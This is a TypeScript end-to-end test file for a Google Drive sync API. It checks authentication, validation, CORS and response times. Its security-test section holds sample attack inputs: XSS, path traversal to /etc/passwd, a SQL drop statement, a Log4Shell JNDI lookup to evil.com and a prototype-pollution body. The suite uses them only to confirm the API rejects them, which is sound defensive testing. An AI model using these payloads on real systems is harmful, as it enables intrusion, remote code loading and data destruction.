import { describe, it, expect } from 'vitest';
import request from 'supertest';
import { app } from '../index.js';

// E2E tests for Drive API endpoints
describe('Drive API E2E Tests', () => {
  // These tests require real authentication
  // In a real project there would be setup for test user
  
  describe('Health Check', () => {
    it('should return health status', async () => {
      const response = await request(app)
        .get('/health')
        .expect(200);

      expect(response.body).toEqual({ status: 'healthy' });
    });
  });

  describe('Authentication Required Endpoints', () => {
    it('should require authentication for drive files endpoint', async () => {
      await request(app)
        .get('/api/drive/files')
        .expect(401);
    });

    it('should require authentication for sync endpoint', async () => {
      await request(app)
        .post('/api/drive/sync')
        .expect(401);
    });

    it('should require authentication for file by id endpoint', async () => {
      await request(app)
        .get('/api/drive/files/some-file-id')
        .expect(401);
    });

    it('should require authentication for file update endpoint', async () => {
      await request(app)
        .put('/api/drive/files/some-file-id')
        .send({ name: 'New Name' })
        .expect(401);
    });

    it('should require authentication for file delete endpoint', async () => {
      await request(app)
        .delete('/api/drive/files/some-file-id')
        .expect(401);
    });
  });

  describe('Request Validation', () => {
    it('should validate pagination parameters', async () => {
      // Test without authentication will show 401, but with invalid parameters
      // In a real test with authentication this would return 400
      await request(app)
        .get('/api/drive/files?page=invalid')
        .expect(401); // Authentication is checked first
    });

    it('should handle malformed JSON in request body', async () => {
      await request(app)
        .post('/api/drive/sync')
        .send('invalid json')
        .set('Content-Type', 'application/json')
        .expect(400); // Malformed JSON should return 400 Bad Request
    });
  });

  describe('Error Handling', () => {
    it('should handle non-existent routes', async () => {
      await request(app)
        .get('/api/drive/non-existent')
        .expect(401); // Auth middleware runs first, so 401 is expected
    });

    it('should handle invalid HTTP methods', async () => {
      await request(app)
        .patch('/api/drive/files')
        .expect(401); // Auth middleware runs first, so 401 is expected
    });
  });

  describe('CORS and Headers', () => {
    it('should include CORS headers', async () => {
      const response = await request(app)
        .get('/health')
        .set('Origin', 'http://localhost:5173') // Add Origin to activate CORS
        .expect(200);

      // Verify that CORS is configured
      expect(response.headers).toHaveProperty('access-control-allow-origin');
    });

    it('should handle preflight requests', async () => {
      await request(app)
        .options('/api/drive/files')
        .expect(204); // OPTIONS requests typically return 204 No Content
    });
  });
});

// Tests for validation and data processing logic
describe('Data Processing Logic E2E', () => {
  describe('File Type Validation', () => {
    const supportedMimeTypes = [
      'application/vnd.google-apps.document',
      'application/vnd.google-apps.spreadsheet',
      'application/vnd.google-apps.presentation',
      'application/pdf',
      'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      'application/vnd.openxmlformats-officedocument.presentationml.presentation',
      'application/msword',
      'application/vnd.ms-excel',
      'application/vnd.ms-powerpoint',
      'text/plain',
      'text/csv',
      'text/html',
      'text/markdown',
      'text/rtf',
      'application/json',
      'application/xml',
      'application/rtf'
    ];

    it('should recognize all supported file types', () => {
      const canExtractContent = (mimeType: string): boolean => {
        return supportedMimeTypes.includes(mimeType) || mimeType.startsWith('text/');
      };

      supportedMimeTypes.forEach(mimeType => {
        expect(canExtractContent(mimeType)).toBe(true);
      });

      // Test text types
      expect(canExtractContent('text/custom')).toBe(true);
      expect(canExtractContent('text/x-custom')).toBe(true);
      
      // Test unsupported types
      expect(canExtractContent('image/jpeg')).toBe(false);
      expect(canExtractContent('video/mp4')).toBe(false);
      expect(canExtractContent('audio/mp3')).toBe(false);
    });
  });

  describe('Response Format Validation', () => {
    it('should validate file list response format', () => {
      const mockFileListResponse = {
        files: [
          {
            id: 'file-1',
            name: 'Test File.pdf',
            mimeType: 'application/pdf',
            size: '12345',
            modifiedTime: '2025-01-01T10:00:00.000Z',
            contentFetched: true
          }
        ],
        pagination: {
          page: 1,
          limit: 20,
          totalCount: 1,
          totalPages: 1,
          hasNext: false,
          hasPrev: false
        }
      };

      // Response structure validation
      expect(mockFileListResponse).toHaveProperty('files');
      expect(mockFileListResponse).toHaveProperty('pagination');
      expect(Array.isArray(mockFileListResponse.files)).toBe(true);
      expect(mockFileListResponse.pagination).toHaveProperty('page');
      expect(mockFileListResponse.pagination).toHaveProperty('totalCount');
    });

    it('should validate sync response format', () => {
      const mockSyncResponse = {
        message: 'Files synced successfully',
        stats: {
          totalFetched: 5,
          totalSaved: 3,
          totalSkipped: 2,
          contentExtracted: 2,
          contentFailed: 1
        }
      };

      expect(mockSyncResponse).toHaveProperty('message');
      expect(mockSyncResponse).toHaveProperty('stats');
      expect(mockSyncResponse.stats).toHaveProperty('totalFetched');
      expect(mockSyncResponse.stats).toHaveProperty('contentExtracted');
      expect(mockSyncResponse.stats).toHaveProperty('contentFailed');
      
      // Verify data types
      expect(typeof mockSyncResponse.stats.totalFetched).toBe('number');
      expect(typeof mockSyncResponse.stats.contentExtracted).toBe('number');
    });
  });

  describe('Error Response Validation', () => {
    it('should validate error response format', () => {
      const mockErrorResponse = {
        error: 'File not found',
        code: 'FILE_NOT_FOUND',
        details: {
          fileId: 'non-existent-file',
          timestamp: '2025-01-01T10:00:00.000Z'
        }
      };

      expect(mockErrorResponse).toHaveProperty('error');
      expect(typeof mockErrorResponse.error).toBe('string');
      expect(mockErrorResponse.error.length).toBeGreaterThan(0);
    });
  });
});

// Performance tests
describe('Performance Tests', () => {
  describe('Response Time', () => {
    it('should respond to health check quickly', async () => {
      const startTime = Date.now();
      
      await request(app)
        .get('/health')
        .expect(200);
        
      const responseTime = Date.now() - startTime;
      expect(responseTime).toBeLessThan(100); // Should respond quickly
    });

    it('should handle multiple concurrent requests', async () => {
      const requests = Array.from({ length: 10 }, () => 
        request(app).get('/health').expect(200)
      );

      const startTime = Date.now();
      await Promise.all(requests);
      const totalTime = Date.now() - startTime;

      expect(totalTime).toBeLessThan(1000); // 10 requests per second
    });
  });

  describe('Memory Usage', () => {
    it('should not leak memory during multiple requests', async () => {
      const initialMemory = process.memoryUsage().heapUsed;
      
      // Make many requests
      for (let i = 0; i < 50; i++) {
        await request(app).get('/health').expect(200);
      }
      
      // Force garbage collection (if available)
      if (global.gc) {
        global.gc();
      }
      
      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = finalMemory - initialMemory;
      
      // Memory increase should not be critical
      expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024); // 50MB
    });
  });
});

// Security tests
describe('Security Tests', () => {
  describe('Input Sanitization', () => {
    it('should handle malicious input in query parameters', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        'DROP TABLE users;',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const input of maliciousInputs) {
        await request(app)
          .get(`/api/drive/files?search=${encodeURIComponent(input)}`)
          .expect(401); // Should require authentication
      }
    });

    it('should handle malicious input in request body', async () => {
      const maliciousPayload = {
        name: '<script>alert("xss")</script>',
        __proto__: { admin: true },
        constructor: { prototype: { admin: true } }
      };

      await request(app)
        .put('/api/drive/files/test-file')
        .send(maliciousPayload)
        .expect(401); // Should require authentication
    });
  });

  describe('Rate Limiting', () => {
    it('should handle rapid requests gracefully', async () => {
      const rapidRequests = Array.from({ length: 100 }, () => 
        request(app).get('/health')
      );
      
      // All requests should complete without server errors
      const responses = await Promise.allSettled(rapidRequests);
      
      responses.forEach(response => {
        if (response.status === 'fulfilled') {
          expect([200, 429]).toContain(response.value.status); // 200 or 429 (rate limited)
        }
      });
    });
  });
});
